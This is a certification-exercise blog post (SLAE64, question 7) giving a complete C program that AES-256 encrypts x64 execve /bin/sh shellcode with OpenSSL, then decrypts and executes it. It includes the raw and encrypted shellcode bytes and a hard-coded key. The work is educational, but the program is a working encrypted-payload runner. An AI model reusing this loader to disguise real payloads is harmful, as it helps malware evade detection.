title: AES-256 Encrypted Shellcode
date: 2018-05-19
published: true 
summary: My solution to SLAE64 Exam Question 7
tags: shellcode, exploit, assembly

#AES-256 Encrypted Shellcode

This is my solution to the seventh exam question of the SLAE64 certification. This exercise was to write a program that decrypts shellcode and executes it. Of course, you would also need to encrypt the shellcode somehow first. Any programming language was acceptable. 

Since I had already been writing mainly C shellcode runners for this class, and I really never have an excuse to program in C anymore, I chose to use AES encryption in a C program. As any security professional will tell you, it's best to use a trusted crypto (whoah - does crypto mean something other than bitcoin?!?) library rather than attempting to write your own. I used the openssl library for this exercise.

My full program is here:

    #include<stdio.h>
    #include<string.h>
    #include<stdlib.h>
    #include<openssl/aes.h>


    //encryption utility function declarations
    void print_data(const char* label, const void* data, int len);

    unsigned char execve_sc[] = \
    "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

    unsigned char encrypted_execve_sc[] = \
    "\x05\xE9\xE4\x47\x52\xFF\xA5\x90\x0A\xA1\x7A\xFA\x6B\x63\x69\x22\x8C\x64\xD0\xDC\x0E\x0A\xC3\xB0\x7B\x34\x9D\x97\x06\x02\x4A\x82\xF3\xF7\x08\x59\x61\xEB\x1C\x01\xB9\xCE\xDE\x9B\x7B\x0A\x04\xD2\xC0\xB9\x88\xB5\x45\x7F\x00\x00\x18\x04\x40\x00\x00\x00\x00\x00\xF8";

    int main(int argc, char *argv[])
    {
        const static unsigned char key[] = {0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32};
        unsigned char iv[AES_BLOCK_SIZE];
        //dumb logic - if any arg is passed, just try encoding and printing execve_sc 
        if(argc>1){
            unsigned char tmp_encrypted_execve_sc[sizeof(encrypted_execve_sc)]; 
            AES_KEY enc_key;
            AES_set_encrypt_key(key,sizeof(key)*8,&enc_key);
            memset(iv, 0x46, AES_BLOCK_SIZE);
            AES_cbc_encrypt(execve_sc,tmp_encrypted_execve_sc,sizeof(execve_sc),&enc_key,iv,AES_ENCRYPT);
            print_data("enc",tmp_encrypted_execve_sc,sizeof(tmp_encrypted_execve_sc));  
            return; 
        }
        //otherwise we just go ahead and decrypt

        unsigned char decrypted_execve_sc[sizeof(encrypted_execve_sc)]; 

        AES_KEY dec_key;
        AES_set_decrypt_key(key,sizeof(key)*8,&dec_key);
        memset(iv, 0x46, AES_BLOCK_SIZE);
        AES_cbc_encrypt(encrypted_execve_sc,decrypted_execve_sc,sizeof(encrypted_execve_sc),&dec_key,iv,AES_DECRYPT);
        print_data("dec",decrypted_execve_sc,sizeof(decrypted_execve_sc));  

        int (*ret)() = (int(*)())decrypted_execve_sc;

        ret();

    }

    //encryption utility function definitions
    void print_data(const char* label, const void* data, int len){
        printf("%s : ", label);
        const unsigned char * p = (const unsigned char*) data;
        int i;
        
        for(i=0;i<len;i++){
            printf("\\x%02X", *p++);
        }   
        
        printf("\n");
    }

As you can see - I was pretty sloppy and just threw in an option to encrypt the cleartext if you passed any commmand line argument. I used this originally to print out the encrypted shellcode for execution and just left it as evidence of the process:

![enc shellcode](/static/blog/2018/SLAE64/7/encrypt_shellcode.png)

Again, the example shellcode used for this problem was the `execve` program to spawn `/bin/sh`.

Other than that, I think the code and API's used are pretty self-explanatory by name. One interesting detail is that the decryption is actually done with the function `AES_cbc_encrypt()`, which makes sense as AES is a symmetric algorithm.

Running the program prints out the decrypted bytes and gives me a shell once again:

![enc shell](/static/blog/2018/SLAE64/7/encrypted_shell.png)

All code referenced in this blog post is available at: <https://github.com/mrT-F/SLAE64/tree/master/7>

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification.* 

*Certification at: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>*

*Student ID: SLAE64 - 1546*